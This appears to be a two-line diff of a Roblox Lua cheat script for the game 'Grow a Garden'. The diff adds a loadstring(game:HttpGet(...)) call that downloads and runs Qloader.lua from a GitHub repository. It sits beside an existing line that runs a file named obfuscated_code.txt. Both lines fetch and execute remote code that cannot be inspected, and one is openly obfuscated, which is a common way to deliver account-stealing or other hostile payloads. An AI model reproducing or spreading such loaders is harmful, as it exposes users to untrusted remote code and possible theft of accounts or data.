@@ -1,1 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-Scr1pt/scripts/refs/heads/main/Qloader.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGarden-Scr1pt/scripts/refs/heads/main/obfuscated_code.txt"))()
